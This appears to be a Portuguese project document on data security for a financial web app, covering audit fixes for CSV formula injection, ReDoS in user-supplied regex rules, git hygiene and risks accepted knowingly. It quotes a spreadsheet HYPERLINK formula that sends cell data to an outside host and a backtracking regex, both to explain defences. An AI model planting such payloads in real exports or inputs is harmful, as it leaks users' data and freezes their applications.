> Leia antes de mexer em importação de arquivo, exportação de CSV, perfis de plano ou qualquer coisa que saia do navegador.

# Segurança dos dados

Este app lida com movimentação financeira real de uma instituição. Os
pontos abaixo saíram de uma auditoria e **não devem ser afrouxados.**

**`.gitignore` protege `fixtures/` e toda planilha.** Antes não protegia:
só por sorte nenhum arquivo real foi commitado. Commit não se apaga — uma
vez versionado, o dado sobrevive no histórico e em todo clone. A regra é
`fixtures/*` com exceção para `*.mjs`, mais `*.xlsx`/`*.csv`/etc. em
qualquer pasta.

**Injeção de fórmula no CSV** (`neutralizarFormula`). Excel avalia como
fórmula qualquer célula iniciada por `= + - @` tab ou CR. Uma descrição
de conta como `=HYPERLINK("http://...&"&A1)` vira link que exfiltra dados
da planilha. O texto vem do plano de contas e da descrição das contas —
dados que o app não controla — e o destino do CSV é ser aberto no Excel
por um contador. A defesa é prefixar com aspa simples. O Excel (xlsx)
não precisa disso: SheetJS grava célula de texto como texto, não fórmula.

**ReDoS via perfil de plano de contas** (`padraoSeguro`). `regras` do
tipo `nome` traziam regex de arquivo direto para `new RegExp`. `(a+)+$`
contra 30 caracteres leva mais de 30 segundos e **congela a aba de vez**
— JavaScript não interrompe regex em andamento. Padrão com quantificador
aninhado, maior que 120 caracteres ou inválido é recusado na leitura e a
regra é descartada com aviso, em vez de derrubar o app.

**O que sai do navegador diminuiu, e é para continuar assim.** Com a
remoção da aba Arquivos e da imagem do Painel, a ÚNICA coisa que este app
manda para fora da máquina é o `historico.json` da sincronização — totais
de DRE, sem conta e sem lançamento. Todo envio novo para o GitHub tem que
justificar por que precisa sair, e a lição que ficou do que existia antes
continua valendo: **visibilidade de repositório se consulta, não se
presume** (o aviso já chegou a dizer "este repositório é público" para um
repositório privado, o que tanto assusta à toa quanto ensina o usuário a
ignorar avisos).

**Riscos aceitos conscientemente** (documentados, não corrigidos):

- *Token do GitHub em `localStorage`* — qualquer XSS o vaza. Mitigado por
  não haver nenhum ponto de injeção de HTML no app (sem
  `dangerouslySetInnerHTML`, sem `innerHTML`, sem `eval`), e pela
  orientação de usar token fine-grained, só deste repositório, com
  expiração curta.
- *`xlsx` 0.18.5 tem duas falhas altas conhecidas* (prototype pollution e
  ReDoS, GHSA-4r6h-8v6p-xvw6 e GHSA-5pgg-2g8v-p4x9) e **não há correção
  no npm** — o SheetJS saiu do registro público na versão 0.20. Atualizar
  exige apontar para `cdn.sheetjs.com`, o que quebra `npm ci` no CI. O
  risco concreto exige abrir uma planilha maliciosa, e os arquivos aqui
  vêm do próprio sistema contábil do usuário.
- *Sessão em IndexedDB sem criptografia* — dado financeiro fica no disco
  da máquina. É o preço de não perder a importação num F5; por isso
  "Limpar tudo" precisa continuar sendo botão visível.

